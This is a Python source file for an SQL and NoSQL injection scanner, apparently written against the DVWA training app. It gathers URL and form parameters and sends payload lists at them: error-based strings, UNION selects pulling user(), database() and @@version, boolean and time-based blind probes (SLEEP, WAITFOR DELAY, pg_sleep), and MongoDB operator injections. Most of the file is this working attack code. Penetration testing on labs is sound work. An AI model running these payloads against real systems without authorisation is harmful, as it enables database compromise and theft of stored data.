import requests
from urllib.parse import urlparse, urljoin, urlencode
from bs4 import BeautifulSoup
import re
import time

class SQLiScanner:
    def __init__(self, url, args, session=None):
        self.url = url
        self.args = args
        self.session = session if session else requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })

        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies and not session:
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    self.session.cookies[key] = val

        self.results = []
        self.vuln_types = set()

    def extract_vectors(self):
        vectors = []

        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')

            # URL parameters
            parsed = urlparse(self.url)
            if parsed.query:
                for param in parsed.query.split('&'):
                    if '=' in param:
                        key, val = param.split('=', 1)
                        vectors.append({
                            'url': self.url,
                            'param': key,
                            'method': 'GET',
                            'type': 'url_param',
                            'current_value': val
                        })

            # If no params found, add common ones (DVWA uses ?id=)
            if not vectors:
                for common_param in ['id', 'uid', 'user', 'page', 'cat']:
                    vectors.append({
                        'url': self.url,
                        'param': common_param,
                        'method': 'GET',
                        'type': 'url_param',
                        'current_value': '1'
                    })

            # Form inputs
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if not action or action == '#':
                    action = self.url
                else:
                    action = urljoin(self.url, action)

                method = form.get('method', 'get').lower()

                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name')
                    if name and input_tag.get('type', 'text') not in ['submit', 'button', 'image']:
                        vectors.append({
                            'url': action,
                            'param': name,
                            'method': method,
                            'type': 'form'
                        })

        except Exception as e:
            print(f"    [!] Error extracting vectors: {e}")

        return vectors

    def get_user_token(self, url_override=None):
        """Extract DVWA user_token from a page."""
        target = url_override or self.url
        try:
            r = self.session.get(target, timeout=self.args.timeout)
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token.get('value', '') if token else ''
        except:
            return ''

    def test_error_based_sqli(self, vector):
        error_patterns = {
            'MySQL': [
                r'SQL syntax.*MySQL', r'Warning.*mysql_', r'MySQLSyntaxErrorException',
                r'valid MySQL result', r'MySqlException', r'Uncaught mysqli_sql_exception',
                r'check the manual.*MySQL', r'Driver.*MySQL', r'MySQLStatement'
            ],
            'PostgreSQL': [
                r'PostgreSQL.*ERROR', r'Warning.*\Wpg_', r'valid PostgreSQL result',
                r'PG::SyntaxError', r'ERROR.*pg_', r'PostgreSQL.*syntax'
            ],
            'Oracle': [
                r'ORA-[0-9]{5}', r'ORA-[0-9]{4}', r'Oracle.*Driver', r'ORA_EXCEPTION',
                r'PL/SQL.*Warning', r'Warning.*oci_'
            ],
            'SQLite': [
                r'SQLite/JDBCDriver', r'SQLite.Exception', r'System.Data.SQLite.SQLiteException',
                r'Warning.*sqlite_', r'Warning.*SQLite3::', r'unrecognized token'
            ],
            'MSSQL': [
                r'\[SQL Server\]', r'Driver.*SQL Server', r'SQL Server.*Driver',
                r'Unclosed quotation mark', r'mssql_', r'Microsoft OLE DB',
                r'Exception.*System\.Data\.SqlClient'
            ],
            'Generic': [
                r'You have an error in your SQL', r'Warning.*odbc_', r'ODBC.*Error',
                r'Error.*SQL.*Driver', r'SQLSTATE', r'Invalid SQL', r'DBMS'
            ]
        }

        # Key DVWA SQLi payloads first
        payloads = [
            "'", "''", "1'", "' OR '1'='1", "' OR '1'='1' --",
            "' OR '1'='1' #", "\" OR \"1\"=\"1", "' OR 1=1--",
            "1' OR '1'='1", "1' OR '1'='1' --", "' OR 1=1 LIMIT 1--",
            "') OR ('1'='1", "1)) OR ((1=1", "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "admin' --", "admin' #", "1 AND 1=1", "1 AND 1=2",
            "' AND 1=1--", "' AND 1=2--",
            # Specific UNION-based for DVWA (5 columns expected)
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,user(),3,4,5--",
            "' UNION SELECT 1,database(),3,4,5--",
            "' UNION SELECT 1,@@version,3,4,5--",
        ]

        for payload in payloads:
            try:
                data = {vector['param']: payload}

                # Handle DVWA POST forms with user_token
                token = ''
                if vector.get('type') == 'form':
                    token = self.get_user_token(vector['url'])

                if vector['method'] == 'POST':
                    if token:
                        data['user_token'] = token
                        data['Submit'] = 'Submit'
                    response = self.session.post(vector['url'], data=data, timeout=self.args.timeout)
                else:
                    response = self.session.get(vector['url'], params=data, timeout=self.args.timeout)

                for db_type, patterns in error_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.vuln_types.add('SQLi (Error-based)')
                            return {
                                'url': vector['url'],
                                'param': vector['param'],
                                'payload': payload[:60],
                                'technique': f'Error-based SQLi ({db_type})',
                                'confidence': 'High',
                                'evidence': f'Database error pattern: {db_type}'
                            }

                # Check for UNION query success (data in response)
                if 'UNION' in payload and response.status_code == 200:
                    if any(x in response.text for x in ['user()', 'database()', '@@version', '2,3,4,5']):
                        self.vuln_types.add('SQLi (UNION-based)')
                        return {
                            'url': vector['url'],
                            'param': vector['param'],
                            'payload': payload[:60],
                            'technique': 'UNION-based SQLi',
                            'confidence': 'High',
                            'evidence': 'UNION query returned data in response'
                        }

            except Exception:
                continue

        return None

    def test_blind_sqli(self, vector):
        # Boolean-based blind
        bool_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("1' AND '1'='1", "1' AND '1'='2"),
        ]

        for true_payload, false_payload in bool_payloads[:2]:
            try:
                data_true = {vector['param']: true_payload}
                resp_true = self.session.get(vector['url'], params=data_true, timeout=self.args.timeout)

                data_false = {vector['param']: false_payload}
                resp_false = self.session.get(vector['url'], params=data_false, timeout=self.args.timeout)

                if abs(len(resp_true.text) - len(resp_false.text)) > 50:
                    self.vuln_types.add('SQLi (Blind Boolean)')
                    return {
                        'url': vector['url'],
                        'param': vector['param'],
                        'payload': f'Truth test: {true_payload[:40]}',
                        'technique': 'Blind Boolean-based SQLi',
                        'confidence': 'Medium',
                        'evidence': f'Response lengths differ: {len(resp_true.text)} vs {len(resp_false.text)}'
                    }
            except:
                continue

        # Time-based blind
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR SLEEP(5) #",
            "1 OR SLEEP(5)",
            "1' OR SLEEP(5) AND '1'='1",
            "\" OR SLEEP(5) AND \"1\"=\"1",
            "' WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "1' OR pg_sleep(5)--"
        ]

        for payload in time_payloads:
            try:
                start = time.time()
                data = {vector['param']: payload}
                self.session.get(vector['url'], params=data, timeout=10)
                elapsed = time.time() - start

                if elapsed > 4.5:
                    self.vuln_types.add('SQLi (Time-based Blind)')
                    return {
                        'url': vector['url'],
                        'param': vector['param'],
                        'payload': payload[:60],
                        'technique': 'Time-based Blind SQLi',
                        'confidence': 'High',
                        'evidence': f'Response time: {elapsed:.2f}s (expected ~5s delay)'
                    }
            except requests.Timeout:
                self.vuln_types.add('SQLi (Time-based Blind)')
                return {
                    'url': vector['url'],
                    'param': vector['param'],
                    'payload': payload[:60],
                    'technique': 'Time-based Blind SQLi',
                    'confidence': 'High',
                    'evidence': 'Request timed out (expected delay)'
                }
            except:
                continue

        return None

    def test_nosqli(self, vector):
        nosql_payloads = [
            '{"$gt": ""}',
            '{"$ne": ""}',
            '[$ne]=1',
            '[$gt]=',
            "' || '1'=='1",
            "' || '1'=='2",
            '{"$regex": ".*"}',
            '[$regex]=.*',
            '{$gt: ""}',
            'true',
            '$where: "1==1"',
        ]

        for payload in nosql_payloads:
            try:
                data_str = f"{vector['param']}={payload}"
                test_url = f"{vector['url']}?{data_str}"
                response = self.session.get(test_url, timeout=self.args.timeout)

                if any(err in response.text for err in ['MongoError', 'MongoDB', 'Unknown modifier',
                                                       "can't append to object", 'PlanExecutor']):
                    self.vuln_types.add('NoSQL Injection')
                    return {
                        'url': vector['url'],
                        'param': vector['param'],
                        'payload': payload[:60],
                        'technique': 'NoSQL Injection',
                        'confidence': 'High',
                        'evidence': 'NoSQL error pattern detected'
                    }
            except Exception:
                continue

        return None

    def scan(self):
        print("    [*] Extracting input vectors...")

        vectors = self.extract_vectors()

        if not vectors:
            print("    [!] No input vectors found")
            return []

        print(f"    [*] Found {len(vectors)} input vectors")
        print(f"    [*] Testing SQLi, Blind SQLi, and NoSQLi...")

        for vector in vectors:
            result = self.test_error_based_sqli(vector)
            if result:
                self.results.append(result)
                print(f"    [!] {result['technique']} on {vector['param']}")

            if not result:
                result = self.test_blind_sqli(vector)
                if result:
                    self.results.append(result)
                    print(f"    [!] {result['technique']} on {vector['param']}")

            result = self.test_nosqli(vector)
            if result:
                self.results.append(result)
                print(f"    [!] {result['technique']} on {vector['param']}")

        if self.vuln_types:
            print(f"    [*] Vulnerability types detected: {', '.join(self.vuln_types)}")
        else:
            print("    [+] No SQL/NoSQL injection vulnerabilities detected")

        return self.results